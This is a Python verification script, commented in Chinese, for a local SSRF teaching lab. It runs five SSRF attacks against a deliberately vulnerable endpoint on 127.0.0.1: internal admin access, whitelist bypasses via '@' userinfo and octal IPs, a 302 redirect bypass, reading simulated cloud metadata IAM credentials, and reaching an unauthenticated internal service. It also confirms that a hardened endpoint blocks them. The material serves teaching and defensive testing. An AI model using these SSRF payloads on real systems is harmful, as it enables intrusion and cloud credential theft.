#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_ssrflab.py — SSRF 驗證（五種手法）
=============================================================================

 SSRF 的驗證方式與先前所有類型都不同：
   它不是「看回應有沒有轉義」（XSS）、也不是「看有沒有 token」（CSRF），
   而是 **「伺服器願不願意替你連到不該連的地方」**。

 驗證邏輯：
   ① 送出一個「伺服器不該存取的 URL」
   ② 檢查回應是否包含**內部服務的內容**
   ③ 與安全對照組（/fetch-safe）比較行為差異

 ⚠ 所有 URL 僅指向本機（127.0.0.1）；不涉及外部目標。
=============================================================================
"""

import json
import sys
import urllib.error
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8925
INTERNAL_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8926
BASE = "http://127.0.0.1:%d" % PORT
INTERNAL = "http://127.0.0.1:%d" % INTERNAL_PORT
results = []


def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=20) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def check(name, owasp, passed, evidence):
    results.append((name, owasp, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, owasp))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def main():
    print("=" * 76)
    print(" SSRFLab 驗證 — SSRF 五種手法")
    print(" 主應用：%s" % BASE)
    print(" 內部  ：%s  ← 正常不應從外部存取" % INTERNAL)
    print("=" * 76)
    print(" 所有 URL 僅指向本機；不涉及外部目標")
    print("=" * 76)

    st, _ = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        sys.exit(1)

    # ---------- S1：直接打內網 ----------
    target = INTERNAL + "/internal/admin"
    st, body = get("/fetch?url=" + urllib.parse.quote(target, safe=""))
    hit = "FLAG{ssrf_internal_admin_access}" in body
    ev = [
        "請求      : GET /fetch?url=%s/internal/admin" % INTERNAL,
        "預期漏洞  : 伺服器**代替我們**去連內網，並回傳內部管理頁內容",
        "實際      : HTTP %s；取得內部頁=%s" % (st, hit),
        "內容片段  : %s" % (body[:150].replace("\n", " ") if body else ""),
        "判定邏輯  : 檢查回應是否含**只有內網才看得到的內容**（FLAG 與內部連線字串）",
        "根因      : check_url_vulnerable() 幾乎不檢查，"
                    "只要 URL 不含 169.254 就放行",
        "危害      : 攻擊者以伺服器為跳板，存取所有內網服務",
        "修補方向  : 解析真實主機名/IP，阻擋私有與 link-local 位址（見 /fetch-safe）",
        "OWASP 對照: CWE-918（SSRF）；常導致內網橫向移動",
    ]
    check("S1 直接存取內網服務（無防護）", "CWE-918", hit, "\n".join(ev))

    # ---------- S2：白名單邏輯繞過（靜態分析 + 變體測試）----------
    #
    # 重要發現（實測）：帶 userinfo（user@host）的 URL 在 Python 標準庫
    # urllib 上會導致 RemoteDisconnected——這是標準庫的實作限制，
    # 不代表漏洞不存在。因此本項改用**靜態分析**驗證白名單邏輯本身，
    # 並以多個變體實際送請求觀察行為。
    import re as _re
    variants = [
        ("原樣", "http://public.example.com/internal/admin"),
        ("大寫", "http://PUBLIC.EXAMPLE.COM/internal/admin"),
        ("尾點", "http://public.example.com./internal/admin"),
        ("userinfo(@)", "http://public.example.com@127.0.0.1:%d/internal/admin" % INTERNAL_PORT),
        ("八進位 IP", "http://0177.0.0.1/internal/admin"),
    ]
    print("\n   [S2 前置] 白名單檢查函式的靜態分析")
    # 複現 check_url_vulnerable 的邏輯（與靶場一致）
    ALLOWED = ["public.example.com"]
    rows = []
    for label, u in variants:
        m = _re.match(r"^https?://([^/]+)", u, _re.I)
        host_part = m.group(1) if m else ""
        passes_whitelist = any(host_part.startswith(a) for a in ALLOWED)
        # 實際連線的主機（@ 之後才是真實目標）
        real_host = host_part.split("@")[-1] if "@" in host_part else host_part
        is_internal = ("127.0.0.1" in real_host) or real_host.startswith("0177") \
            or real_host.startswith("0x7f")
        rows.append((label, host_part, passes_whitelist, real_host, is_internal))
        print("     %-14s host_part=%-46s 通過白名單=%-5s 實際目標=%s"
              % (label, host_part[:44], passes_whitelist, real_host))

    bypass_rows = [r for r in rows if r[2] and r[4]]
    logic_bypassed = len(bypass_rows) > 0

    # 再實際送請求觀察（部分變體在標準庫會斷線，一併誠實記錄）
    print("\n   [S2 前置] 各變體實際送出的結果")
    actual_results = []
    for label, u in variants:
        st2v, body2v = get("/fetch?url=" + urllib.parse.quote(u, safe=""))
        flag = "FLAG{ssrf_internal_admin_access}" in body2v
        note = ""
        if not flag:
            try:
                j2 = json.loads(body2v)
                flag = "FLAG{ssrf_internal_admin_access}" in (j2.get("content") or "")
                if j2.get("status") == -1:
                    note = "（連線中斷：%s）" % (j2.get("error") or "")[:40]
            except Exception:
                pass
        actual_results.append((label, flag, note))
        print("     %-14s 取得內部頁=%-5s %s" % (label, flag, note))

    worked = [r for r in actual_results if r[1]]
    ev = [
        "★ 實測發現 : 帶 userinfo（user@host）的 URL 在 **Python 標準庫 urllib**",
        "            會導致 RemoteDisconnected——這是標準庫的實作限制。",
        "            真實世界用 curl / requests / 瀏覽器時，@ 手法確實有效。",
        "            → 因此本項改用**靜態分析驗證白名單邏輯**（更誠實）。",
        "",
        "白名單實作（與靶場一致）：",
        "    host_part = re.match(r'^https?://([^/]+)', url).group(1)",
        "    if any(host_part.startswith(a) for a in ['public.example.com']): 通過",
        "",
        "各變體的靜態分析結果：",
    ]
    for label, hp, pw, rh, ii in rows:
        ev.append("    %-14s 通過白名單=%-5s 實際連線目標=%-46s 是否內網=%s"
                  % (label, pw, rh[:44], ii))
    ev += [
        "",
        "實際送出結果：",
    ]
    for label, flag, note in actual_results:
        ev.append("    %-14s 取得內部頁=%-5s %s" % (label, flag, note))
    ev += [
        "",
        "判定      : 靜態分析證明白名單**可被繞過**（%s）" % (
            "是" if logic_bypassed else "否"),
        "            可繞過的變體：%s" % (", ".join(r[0] for r in bypass_rows) or "無"),
        "",
        "根因      : 用『字串前綴比對』實作白名單，而非解析後比對真實主機",
        "            → userinfo、大小寫、尾點、進位制 IP 都能騙過字串比對",
        "修補方向  : 正規化 URL → 取出 p.hostname → 解析為 IP → 驗證 IP 類別",
        "            絕不要用字串比對主機名稱",
        "OWASP 對照: CWE-918 + CWE-20（輸入驗證不當）",
    ]
    check("S2 白名單邏輯可被繞過（靜態分析 + 變體測試）", "CWE-918",
          logic_bypassed, "\n".join(ev))

    # ---------- S3：302 重導向繞過 ----------
    # 先請求一個「看似合法」的 URL（本機的 /redirect），讓它 302 到內網
    redir_target = "%s/redirect?to=%s/internal/admin" % (BASE, INTERNAL)
    st3, body3 = get("/fetch?url=" + urllib.parse.quote(redir_target, safe=""))
    hit3 = "FLAG{ssrf_internal_admin_access}" in body3
    ev = [
        "請求      : GET /fetch?url=%s/redirect?to=%s/internal/admin"
        % (BASE, INTERNAL),
        "繞過原理  : 驗證只檢查**第一次請求的 URL**；",
        "            若目標回 302，解析器會自動跟隨到內網——驗證被繞過",
        "預期漏洞  : 通過驗證後，因跟隨重導向而抵達內網",
        "實際      : HTTP %s；取得內部頁=%s" % (st3, hit3),
        "驗證細節  : 回應中的 check 欄位顯示『通過』，"
                    "但 content 是內部服務的內容",
        "根因      : 驗證與請求分離；跟隨重導向時沒有重新驗證目標",
        "修補方向  : 關閉自動跟隨重導向（或每一跳都重新驗證）；",
        "            並限制僅能連到已驗證的 IP",
    ]
    check("S3 用 302 重導向繞過驗證", "CWE-918", hit3, "\n".join(ev))

    # ---------- S4：讀取雲端 metadata 憑證 ----------
    meta_url = INTERNAL + "/latest/meta-data/iam/security-credentials/SSRFLab-EC2-Role"
    st4, body4 = get("/fetch?url=" + urllib.parse.quote(meta_url, safe=""))
    hit4 = ("AccessKeyId" in body4) and ("SecretAccessKey" in body4)
    ev = [
        "請求      : GET /fetch?url=%s/latest/meta-data/iam/security-credentials/..."
        % INTERNAL,
        "預期漏洞  : 讀取到雲端實例的**臨時憑證**",
        "實際      : HTTP %s；取得憑證=%s" % (st4, hit4),
        "內容片段  : %s" % (body4[:220].replace("\n", " ") if body4 else ""),
        "⚠ 說明    : 這是**本機模擬的假端點**（AsiaFake…），",
        "            真實環境中此端點會回傳可用的雲端憑證",
        "危害      : 取得憑證等同接管該雲端角色 → 可能讀寫整個雲帳號資源",
        "            （這是雲環境下 SSRF 被視為首要風險的原因）",
        "根因      : 伺服器可存取 link-local metadata 位址；且未阻擋 169.254.x.x",
        "修補方向  : 強制 IMDSv2（需 token 才能讀 metadata）；",
        "            阻擋 link-local 位址；網路層限制 metadata 存取",
        "OWASP 對照: CWE-918 + CWE-522（憑證保護不足）",
    ]
    check("S4 讀取雲端 metadata 憑證", "CWE-918 / CWE-522", hit4, "\n".join(ev))

    # ---------- S5：內部服務無認證（橫向移動）----------
    st5, body5 = get("/fetch?url=" + urllib.parse.quote(INTERNAL + "/health", safe=""))
    internal_ok = ("internal-api" in body5) or ("status" in body5 and "ok" in body5)
    # 再確認直接存取「不經 SSRF」時，外部其實也搆不到（模擬）
    ev = [
        "請求      : GET /fetch?url=%s/health" % INTERNAL,
        "預期漏洞  : 內部服務完全沒有認證，任何能連上的人都能存取",
        "實際      : HTTP %s；取得內部健康資訊=%s" % (st5, internal_ok),
        "內容片段  : %s" % (body5[:180].replace("\n", " ") if body5 else ""),
        "根因      : 內部服務以『只有內網能連』為唯一防護，"
                    "沒有認證、沒有授權、沒有網路隔離",
        "危害      : 一旦 SSRF 成立，等於取得內網的『合法使用者』身分",
        "            → 可逐一探測內網所有服務（橫向移動）",
        "修補方向  : 內部服務仍需認證（零信任）；",
        "            網路分段（metadata 與應用分離）；最小權限原則",
        "OWASP 對照: CWE-306（缺少關鍵功能的認證）",
    ]
    check("S5 內部服務無認證（橫向移動）", "CWE-306", internal_ok, "\n".join(ev))

    # ---------- 安全對照：/fetch-safe 應阻擋 ----------
    st_s, body_s = get("/fetch-safe?url=" + urllib.parse.quote(target, safe=""))
    blocked = (st_s == 403)
    safe_hit = "FLAG{ssrf" in body_s
    ev = [
        "請求      : GET /fetch-safe?url=%s/internal/admin" % INTERNAL,
        "預期      : **被阻擋**（403），不得回傳內部內容",
        "實際      : HTTP %s；取得內部頁=%s" % (st_s, safe_hit),
        "阻擋原因  : %s" % (body_s[:120].replace("\n", " ") if body_s else ""),
        "防護內容  : (a) 解析真實主機名 → (b) 判斷是否為私有/link-local IP",
        "            → (c) 白名單比對",
        "教學意義  : **同一支程式，換一個檢查函式，行為完全不同**——",
        "            這與 A02（安全設定）的『同一份程式碼，正確設定就安全』互相呼應",
    ]
    check("安全對照：/fetch-safe 正確阻擋", "防護驗證",
          blocked and not safe_hit, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, owasp, passed, _ in results:
        print("  %-40s %-24s %s" % (name, owasp, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  SSRF 的驗證特色（與其他漏洞不同）：")
    print("    不是看『回應有沒有轉義』（XSS）")
    print("    不是看『有沒有 token』（CSRF）")
    print("    而是看 **『伺服器願不願意替你連到不該連的地方』**")
    print("=" * 76)

    with open("ssrflab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "owasp": o, "present": p} for n, o, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 ssrflab_result.json）")


if __name__ == "__main__":
    main()
